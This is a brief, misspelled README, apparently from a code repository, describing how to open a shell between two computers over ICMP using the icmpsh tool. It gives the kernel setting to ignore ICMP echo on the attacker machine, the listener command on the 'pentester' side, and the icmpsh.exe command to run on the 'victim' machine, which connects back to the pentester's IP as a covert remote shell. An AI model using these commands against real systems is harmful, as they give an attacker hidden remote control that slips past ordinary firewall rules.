# ICMP-connection
Conection ICMP between 2 pc using python
It's necesary install ICMPSH of https://github.com/
inquisb/icmpsh
We've to know: The server it's own computer
You need modified “/proc/sys/net/ipv4/icmp echo ignore_all" and should include “1”
In your comuter you need to write 
>python icmpsh_m.py ip_pentester ip_victim
In the vicims's computer
>icmpsh.exe -t ip_pentester -d 500 -b 30 -s 128
